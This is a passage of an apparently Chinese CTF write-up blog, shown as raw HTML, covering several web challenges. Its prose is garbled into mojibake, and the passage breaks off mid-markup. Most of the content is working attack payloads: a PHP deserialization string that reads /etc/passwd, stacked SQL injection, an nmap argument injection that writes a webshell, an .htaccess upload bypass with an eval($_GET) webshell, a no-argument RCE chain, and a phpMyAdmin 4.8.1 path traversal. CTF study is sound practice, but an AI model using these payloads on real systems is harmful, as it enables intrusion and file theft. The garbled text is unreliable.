id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><ol><li><p>æ­£å¸¸æ„é€ payloadçš„è¯å› ä¸º$opã€$flienameã€$contentéƒ½æ˜¯protectedå±æ€§ï¼Œåºåˆ—åŒ–çš„çš„ç»“æœçš„å±æ€§åå‰é¢ä¼šæœ‰/002.php&gt;7.1ç‰ˆæœ¬å¯¹ç±»å±æ€§çš„æ£€æµ‹ä¸ä¸¥æ ¼æ¥ç»•è¿‡ï¼Œå°†åºåˆ—åŒ–é‡Œçš„portectedå±æ€§æ¢æˆpublicå±æ€§ï¼Œå°±ä¸ä¼šæœ‰/00ï¼Œå¦ä¸€ç§æ–¹å¼åœ¨phpæ‰“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­åªè¦æŠŠå…¶ä¸­çš„sæ”¹æˆå¤§å†™æ‰“Sï¼Œåé¢æ‰“å­—ç¬¦ä¸²å°±å¯ä»¥ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œç”¨phpè„šæœ¬æ¥å®Œæˆæ›¿æ¢ï¼Œå‚è€ƒä¸‹é¢payload</p></li><li><p>è¯»å–/proc/self/cmdlineï¼Œå¾—åˆ°å–é…ç½®æ–‡ä»¶è·¯å¾„/web/config/httpd.confï¼Œå†å¾—åˆ°ç»å¯¹è·¯å¾„</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>Â Â </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span>Â <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">Â Â Â Â <span class="keyword">protected</span>Â <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">Â Â Â Â <span class="keyword">protected</span>Â <span class="variable">$filename</span>=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Â echoÂ urlencode(serialize(newÂ FileHandler));</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$aÂ </span>=Â serialize(<span class="keyword">new</span>Â FileHandler);</span><br><span class="line"><span class="comment">//Â echoÂ $a;</span></span><br><span class="line"><span class="variable">$aÂ </span>=Â str_replace(chr(<span class="number">0</span>),<span class="string">&#x27;\00&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$aÂ </span>=Â str_replace(<span class="string">&#x27;s:&#x27;</span>,<span class="string">&#x27;S:&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>Â urlencode(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/ssti.png"></p><p>tplmapå¯ä»¥ä¸€æ¢­å­ï¼Œä½†éœ€è¦py2ç¯å¢ƒï¼Œä¹Ÿå¯ä»¥ä¸€æ­¥ä¸€æ­¥æ‰‹æ³¨èµ°</p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•:</span><br><span class="line">/WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</span><br><span class="line">/WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ <span class="class"><span class="keyword">class</span> æ–‡ä»¶ï¼ŒåŒ…æ‹¬ <span class="title">servlet</span> <span class="title">class</span> å’Œé<span class="title">servlet</span> <span class="title">class</span>ï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .<span class="title">jar</span>æ–‡ä»¶ä¸­</span></span><br><span class="line"><span class="class">/<span class="title">WEB</span>-<span class="title">INF</span>/<span class="title">lib</span>/ï¼šå­˜æ”¾<span class="title">web</span>åº”ç”¨éœ€è¦çš„å„ç§<span class="title">JAR</span>æ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„<span class="title">jar</span>æ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨<span class="title">jar</span>æ–‡ä»¶</span></span><br><span class="line"><span class="class">/<span class="title">WEB</span>-<span class="title">INF</span>/<span class="title">src</span>/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ª<span class="title">java</span>æ–‡ä»¶ã€‚</span></span><br><span class="line"><span class="class">/<span class="title">WEB</span>-<span class="title">INF</span>/<span class="title">database</span>.<span class="title">properties</span>ï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="class">æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°<span class="title">web</span>.<span class="title">xml</span>æ–‡ä»¶ï¼Œæ¨æ–­<span class="title">class</span>æ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥<span class="title">class</span>æ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘<span class="title">class</span>æ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç </span></span><br></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯è¦çŸ¥é“å»è¯»WEB-INF/web.xmlï¼Œç„¶åæŠŠé‚£äº›classä¸‹è½½ä¸‹æ¥</p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>ä¸‰ç§åŠæ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">handler</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;;handler `1919810931114514` open as `yunenctf`;handler `yunenctf` read first;#</span></span><br><span class="line"><span class="string"># handler `1919810931114514` open as `yunenctf`; å°†æ•°æ®è¡¨è½½å…¥å¹¶å°†è¿”å›å¥æŸ„é‡å‘½å</span></span><br><span class="line"><span class="string"># handler `yunenctf` read first; è¯»å–æŒ‡å®šå¥æŸ„çš„é¦–è¡Œæ•°æ®</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">é‡å‘½å</span></span><br><span class="line"><span class="string">1&#x27;</span>; rename table words to word1; rename table `<span class="number">1919810931114514</span>` to words; alter table words add id <span class="keyword">int</span> unsigned not <span class="literal">Null</span> auto_increment primary key; alter table words change flag data varchar(<span class="number">100</span>);<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">é¢„ç¼–è¯‘prepare</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span></span><br></pre></td></tr></table></figure><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>escapeshellarg â€” æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°</p><p>åŠŸèƒ½ ï¼šescapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œshell å‡½æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦(åå¼•å·)</p><p>escapeshellcmd â€” shell å…ƒå­—ç¬¦è½¬ä¹‰</p><p>åŠŸèƒ½ï¼šescapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚</p><p>åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š &amp;#;`|?~&lt;&gt;^()[]{}$<em>, \x0A å’Œ \xFF</em>ã€‚ *â€™ å’Œ â€œ ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</p><p>ä¸»è¦ç”¨åˆ°nmapçš„ä¸¤ä¸ªå‚æ•°-iL å’Œ-oN ä»¥ä»»æ„æ ¼å¼è¾“å‡ºï¼Œ-oXä¸è¡Œï¼Œè¿™æ ·ä¸ä¼šæŠŠ/flagçš„å†…å®¹è¾“å‡ºï¼Œå¿…é¡»è¦ç”¨-Næ‰èƒ½è§£æ/flagä¸­çš„å†…å®¹ï¼Œä»è€Œè¾“å‡ºåˆ°æŒ‡å®šçš„è·¯å¾„ï¼Œåƒè¿™ç§çŸ­çš„ä»£ç éƒ½å¯ä»¥æ‹¿åˆ°æœ¬åœ°æ¥æµ‹è¯•ï¼Œä¹Ÿå¾ˆæ–¹ä¾¿è°ƒè¯•ã€‚</p><p>payload:&#39; + -iL /flag + -oN è¾“å‡ºè·¯å¾„</p><p>å°†payloadæ„é€ æˆ ?host=&#39; <?php @systeml($_GET["outx"]);?> -oG outx.php &#39; å‰é¢çš„127.0.0.1æˆ‘ä»¬å¯ä»¥ä¸å†™ï¼Œç„¶ååœ¨payloadçš„æœ€åé¢åŠ ä¸Šä¸€ä¸ªç©ºæ ¼å’Œå•å¼•å·ï¼Œå•å¼•å·çš„ç›®çš„æ˜¯é—­åˆå¤„ç†åå¾—åˆ°çš„æœ€åé‚£ä¸ªå•å¼•å·ï¼Œå¦‚æœä¸åŠ ç©ºæ ¼çš„è¯æ–‡ä»¶æœ€åé¢ä¼šå˜æˆ&#39;\&#39;&#39;&#39;å³æ–‡ä»¶æœ€åé¢ä¼šå¤šå‡ºæ¥\ï¼ŒåŠ äº†ç©ºæ ¼ä¹‹åä¼šå˜æˆ hack.php \ ï¼Œä¸å½±å“å‘½ä»¤çš„æ‰§è¡Œã€‚</p><h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>å…ˆä¸Šä¼ ä¸€ä¸ª.htaccess</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;x.php.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>æ„æ€æ˜¯æŠŠjpgæŒ‰phpè¿›è¡Œè§£æï¼Œç„¶åä¸Šä¼ ä¸€ä¸ªshellå°±å¯ä»¥äº†ï¼Œä¸çŸ¥é“ä¸ºå•¥file_get_contentsä¸è¡Œï¼Œäºæ˜¯ç›´æ¥includeäº†ä¸€ä¸‹ï¼Œæˆ–è€…ç”¨readfile(&#39;/flag&#39;);å’Œhighlight_file(&#39;/flag&#39;);</p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>æºç </p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something <span class="keyword">in</span> F12 <span class="keyword">for</span> you</span><br><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;isset($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     die(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     echo <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                echo <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//87d242ef-fc4f-4a1f-aa1c-74a3ce74c7b4.node3.buuoj.cn/?gg[]=1&amp;id[]=2</span></span><br><span class="line"></span><br><span class="line">POST: passwd=1234567a</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>æ ¹æ®å„ç§æç¤ºï¼Œä¸Šä¼ ä¸äº†ph*çš„æ–‡ä»¶ï¼Œè€ƒè™‘å…ˆä¸Šä¼ ä¸€ä¸ª.htaccess</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;x.php.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šä¼ ä¸€ä¸ªphpçš„é©¬ï¼Œæ³¨æ„ä»–ä¼šæ£€æµ‹&lt;?phpï¼Œç”¨ä¸‹é¢çš„é©¬ç»•è¿‡å³å¯ï¼Œflagåœ¨æ ¹ç›®å½•ä¸‹</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="built_in">eval</span>($_GET[x]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">GET /upload/05a4cc97edcd0f5544958e086a68db2c/x.php.jpg?x=var_dump(file_get_contents(%<span class="number">27</span>/flag%<span class="number">27</span>));</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>ç›®å½•æ‰«.gitï¼Œç”¨githackè¿˜åŸåæºç </p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, NULL, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="built_in">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                die(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>åˆ†æåä¸»è¦æœ‰å‡ ç‚¹</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> è¿‡æ»¤äº†å¸¸ç”¨çš„å‡ ä¸ªä¼ªåè®®ï¼Œä¸èƒ½ä»¥ä¼ªåè®®è¯»å–æ–‡ä»¶ã€‚</span><br><span class="line"><span class="number">2.</span> (?R)å¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œåé¢åŠ äº†?é€’å½’è°ƒç”¨ã€‚åªèƒ½åŒ¹é…é€šè¿‡æ— å‚æ•°çš„å‡½æ•°ã€‚</span><br><span class="line"><span class="number">3.</span> æ­£åˆ™åŒ¹é…æ‰äº†et/na/infoç­‰å…³é”®å­—ï¼Œå¾ˆå¤šå‡½æ•°éƒ½ç”¨ä¸äº†ã€‚</span><br><span class="line"><span class="number">4.</span> <span class="built_in">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]); å…¸å‹çš„æ— å‚æ•°RCE</span><br></pre></td></tr></table></figure><p>æ„é€ payload</p><p>è€ƒè™‘scandir(&#39;.&#39;)çš„å½¢å¼æ¥è·å–å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ä¿¡æ¯ã€‚</p><p>localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚è€Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯.</p><p>current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼</p><p>äºæ˜¯scandir(&#39;.&#39;)å°±è½¬åŒ–ä¸º</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p>ä½†è¿˜éœ€è¦å–åˆ°æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶åŠå…¶å†…å®¹ï¼Œå°±éœ€è¦ä»¥ä¸‹æ“ä½œ</p><ol><li>array_reverse() ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ï¼Œå†æ­é…next()å¤„ç†</li><li>array_flip()äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼</li><li>array_rand()ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒï¼Œä¸æ–­åˆ·æ–°è®¿é—®å°±ä¼šä¸æ–­éšæœºè¿”å›ï¼Œæœ¬é¢˜ç›®ä¸­scandir()è¿”å›çš„æ•°ç»„åªæœ‰5ä¸ªå…ƒç´ ï¼Œåˆ·æ–°å‡ æ¬¡å°±èƒ½åˆ·å‡ºæ¥flag.php</li></ol><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå°±å¯ä»¥è·å–åˆ°æƒ³è¦çš„æ–‡ä»¶åæœ€åè°ƒç”¨highlight_file()ã€readfile()ã€show_source()ã€file_get_contents()ï¼ˆè¢«banï¼‰</p><p>å¦ä¸€ç§æ–¹å¼å¯ä»¥é€šè¿‡sessionæ¥å¤„ç†ï¼š</p><p>æœ¬é¢˜ç›®è™½ç„¶banäº†hexå…³é”®å­—ï¼Œå¯¼è‡´hex2bin()è¢«ç¦ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å¹¶ä¸ä¾èµ–äºåå…­è¿›åˆ¶è½¬ASCIIçš„æ–¹å¼ï¼Œå› ä¸ºflag.phpè¿™äº›å­—ç¬¦æ˜¯PHPSESSIDæœ¬èº«å°±æ”¯æŒçš„ã€‚</p><p>ä½¿ç”¨sessionä¹‹å‰éœ€è¦é€šè¿‡session_start()å‘Šè¯‰PHPä½¿ç”¨sessionï¼Œphpé»˜è®¤æ˜¯ä¸ä¸»åŠ¨ä½¿ç”¨sessionçš„ã€‚</p><p>session_id()å¯ä»¥è·å–åˆ°å½“å‰çš„session idã€‚</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(session_id(session_start()));</span><br></pre></td></tr></table></figure><h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p>ç›®å½•æ‰«æåˆ°æœ‰ä¸ªphpmyadminï¼Œä¸éœ€è¦å¯†ç ï¼Œç‰ˆæœ¬4.8.1ï¼Œæ˜¯å­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ç›´æ¥åˆ©ç”¨æ–‡ä»¶åŒ…å«å°±å¯ä»¥</span><br><span class="line">?target=db_datadict.php%253f/../../../../../../../../../flagâ€˜</span><br><span class="line"></span><br><span class="line">ä¹Ÿå¯ä»¥èµ°ä»£ç æ‰§è¡Œï¼Œä¾æ¬¡æ‰§è¡Œ</span><br><span class="line">show <span class="built_in">global</span> variables like <span class="string">&quot;%datadir%&quot;</span>;</span><br><span class="line"></span><br><span class="line">use test;</span><br><span class="line">CREATE TABLE test(code varchar(<span class="number">100</span>));</span><br><span class="line">INSERT INTO test(code) VALUES(<span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">?target=db_datadict.php%253f/../../../../../../../../../<span class="keyword">var</span>/lib/mysql/data/test/test.MYD</span><br><span class="line"></span><br><span class="line">æˆ–è€…åŒ…å«sessionæ–‡ä»¶</span><br><span class="line">?target=db_sql.php%253f/../../../../../../../../tmp/sess_cui65j0c7j9mjmu4b76kio81rj</span><br></pre></td></tr></table></figure><p>db_sql.phpå¯ä»¥æ›¿æ¢æˆï¼š</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 